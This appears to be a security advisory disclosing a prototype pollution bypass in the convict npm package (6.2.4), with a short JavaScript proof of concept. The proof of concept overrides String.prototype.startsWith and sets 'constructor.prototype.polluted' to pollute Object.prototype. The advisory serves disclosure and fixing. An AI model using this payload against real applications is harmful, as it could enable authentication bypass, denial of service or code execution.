summary: "Convict has Prototype Pollution via startsWith() function\n### Summary\nA prototype\
  \ pollution vulnerability exists in the latest version of the convict npm package (6.2.4).\
  \ Despite a previous fix that attempted to mitigate prototype pollution by checking whether\
  \ user input started with a forbidden key, it is still possible to pollute `Object.prototype`\
  \ via a crafted input using `String.prototype`. \n\n### Details\nThe vulnerability resides\
  \ in line 564 of https://github.com/mozilla/node-convict/blob/master/packages/convict/src/main.js\
  \ where `startsWith()` function is used to check whether user provided input contain forbidden\
  \ strings. \n\n### PoC\n#### Steps to reproduce\n1. Install latest version of convict using\
  \ `npm install` or cloning from git\n2. Run the following code snippet:\n\n```javascript\n\
  String.prototype.startsWith = () => false; \nconst convict = require('convict');\nlet obj\
  \ = {};\nconst config = convict(obj);\nconsole.log({}.polluted);\nconfig.set('constructor.prototype.polluted',\
  \ 'yes');\nconsole.log({}.polluted);    // prints yes -> the patch is bypassed and prototype\
  \ pollution occurred\n```\n\n#### Expected behavior\nPrototype pollution should be prevented\
  \ and {} should not gain new properties.\nThis should be printed on the console:\n```\nundefined\n\
  undefined OR throw an Error\n```\n\n#### Actual behavior\n`Object.prototype` is polluted \n\
  This is printed on the console:\n```\nundefined \nyes\n```\n\n### Impact\nThis is a prototype\
  \ pollution vulnerability, which can have severe security implications depending on how convict\
  \ is used by downstream applications. Any application that processes attacker-controlled input\
  \ using `convict.set`  may be affected.\nIt could potentially lead to the following problems:\n\
  \n1. Authentication bypass\n2. Denial of service\n3. Remote code execution (if polluted property\
  \ is passed to sinks like eval or child_process)"
